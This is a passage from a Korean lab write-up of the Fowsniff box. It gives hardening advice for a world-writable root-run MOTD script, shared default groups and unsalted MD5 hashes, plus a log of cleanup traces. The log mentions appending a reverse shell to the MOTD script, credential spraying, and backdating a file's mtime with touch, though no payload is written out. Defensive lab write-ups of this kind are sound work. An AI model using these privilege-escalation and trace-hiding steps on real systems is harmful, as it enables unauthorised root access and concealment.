9. **이 박스의 OSINT 단계는 시험에 전이되지 않는다.** 시험 박스는 자기 완결적이다. 다만 "박스 안에서 자격증명 소스를 못 찾겠으면 박스가 지목한 외부 힌트를 다시 읽는다"는 판단은 유효하다.

## 8. 방어 관점

- **`/opt/cube/cube.sh` 를 `root:root 755` 로.** MOTD 체인에서 실행되는 모든 파일과 그 상위 디렉터리는 비특권 사용자가 쓸 수 없어야 한다. `/opt/cube` 디렉터리가 `777` 이라 파일 권한만 고쳐도 부족하다 — 지우고 새로 만들 수 있다.
- **공유 기본 그룹을 없앤다.** 계정마다 자기 이름 그룹을 기본으로 주고, 공유가 필요하면 보조 그룹으로 명시한다. `users` 를 기본 gid 로 쓰면 "모두가 쓸 수 있는 파일"이 의도치 않게 늘어난다.
- **임시 비밀번호를 메일 본문으로 배포하지 않는다.** 전 직원 동일 비번은 메일함 하나가 뚫리면 전체가 뚫린다. 최소한 계정별로 다르게, 최초 로그인 시 강제 변경(`chage -d 0 <user>`)을 건다.
- **비밀번호를 솔트 없는 MD5 로 저장하지 않는다.** bcrypt/argon2. 유출이 나면 저장 방식이 대응 시간을 결정한다.
- **유출 후 강제 초기화.** 9명 중 8명은 바꿨는데 1명이 안 바꿔서 전체가 뚫렸다. "바꾸라고 안내"가 아니라 만료 처리해야 한다.
- **Dovecot 에 TLS 강제**(`disable_plaintext_auth = yes`) — 현재 `no` 라 평문 인증이 그대로 통과한다. 스프레이 자체를 막지는 못하지만 네트워크 도청 경로를 없앤다.

## 9. 참고 자료

- CVE 없음. 전부 설정·운영 결함이다.
- `pam_motd(8)` / Ubuntu OpenSSH 의 `update-motd` 패치 — 이 박스에서는 문서 대신 `/proc/<pid>/stat` ppid 체인으로 직접 확인했다(4장).
- 원 시나리오의 pastebin(`NrAqVeeX`)은 삭제됨(404). 공개 미러에서 해시 9쌍 복원.
- Fowsniff 는 원래 VulnHub/TryHackMe 박스이고 PG 가 그대로 가져왔다. `/root/flag.txt` 의 미끼 문구가 그 흔적.

## 남긴 흔적

- **`/opt/cube/cube.sh`** — 리버스셸 1줄과 프로세스 추적 프로브를 append 했다가 `truncate -s 850` 으로 되돌렸다. 복원 직후 `md5sum` = `377489e75ac90ece2f92fe30519f371c` 로 백업본(`cube.sh.orig`, 850바이트)과 일치하는 것을 **출력으로 확인**했고, mtime 도 `touch -d "2020-02-28 00:00:00"` 으로 원래 값(Feb 28 2020)으로 복구했다.
- **`/tmp/motd_who.txt`·`/tmp/anc.txt`·`/tmp/cube.bak`** — 메커니즘 확인용 프로브 파일. 삭제하고 `ls -la /tmp` 로 확인. 남은 것은 부팅 때부터 있던 systemd/vmware 디렉터리뿐.
- ⚠️ **마지막 프로브 하나는 결과를 확인하지 못했다.** 위 복원을 끝낸 뒤, 6장의 "`&` 를 빼면 로그인이 멈춘다"를 실증하려고 `cube.sh` 에 `sleep 20` 한 줄을 더 붙이는 명령을 root 셸에 보냈다. 그런데 **그 시점부터 박스가 응답을 멈췄다** — 셸이 명령을 에코만 하고 실행하지 않았고, 곧이어 22/80/110 전부 `No route to host` 가 됐다(포털 쪽에서 박스가 내려갔거나 리버트된 것으로 보인다). 따라서 그 `sleep 20` 이 파일에 **실제로 쓰였는지 확인하지 못했다.** 쓰였다면 `cube.sh` 끝에 `\nsleep 20\n` 이 남아 있고, 안 쓰였다면 위의 복원 상태 그대로다. 박스가 죽어서 재확인도 재정리도 불가능했다. PG 는 리버트 시 베이스 이미지로 되돌아가므로 실질 영향은 없다고 보지만, **"정리 완료"로 적지 않는다.**
- **계정·설정 변경 없음.** 사용자 추가, SSH 키 배치, 서비스 설정 변경을 하지 않았다.
- **Kali 쪽** — `~/PG/Fowsniff/` 산출물 유지. tmux `fow_nmap`·`fow_gob`·`fow_root` 전부 세션 이름으로 종료(당시 tmux 서버에는 이 세 개뿐이었고, 마지막 세션이 닫히며 서버도 같이 내려갔다). 443 리스너 소멸을 `ss -lntp` 로 확인. 중간에 TaskStop 으로 끊겨 고아가 된 `sshpass` 프로세스 2개는 **PID 를 특정해**(354449·354450) 종료했다.
- **남의 프로세스는 건드리지 않았다.** 정리 중 `nc -lvnp 80`(root, PID 347623/347626/347627)이 보였는데 이 박스에서는 443 만 썼으므로 다른 라인의 것이다. 그대로 두었다. 광범위 `pkill` 을 쓰지 않은 이유가 정확히 이것이다.
- 타겟 호스트 상에 `~/.ssh/known_hosts` 류 흔적은 만들지 않았다(스프레이 전부 `-o UserKnownHostsFile=/dev/null`). Kali 의 `known_hosts` 에는 첫 SSH 스프레이 때 `192.168.248.18` 호스트키가 추가됐다.

## 관련 노트

- [[_STATUS]] — 283개 전수 진행현황
- 크론 기반 root 실행 경로: [[Astronaut]] · [[Exfiltrated]] · [[Muddy]] — MOTD 도 "root 가 주기적/이벤트마다 남의 파일을 실행한다"는 같은 부류다. 다른 점은 트리거가 시간이 아니라 **내 로그인**이라 즉시 발동시킬 수 있다는 것.
- 자격증명 재사용 체인(유출 해시 → 크랙 → 다른 서비스에 스프레이)은 다른 노트에도 있을 텐데, 이번 작업에서는 해당 노트들을 열지 않았으므로 링크를 달지 않았다. 색인의 `tech/cred/reuse`·`tech/cred/spray` 태그로 찾을 것.
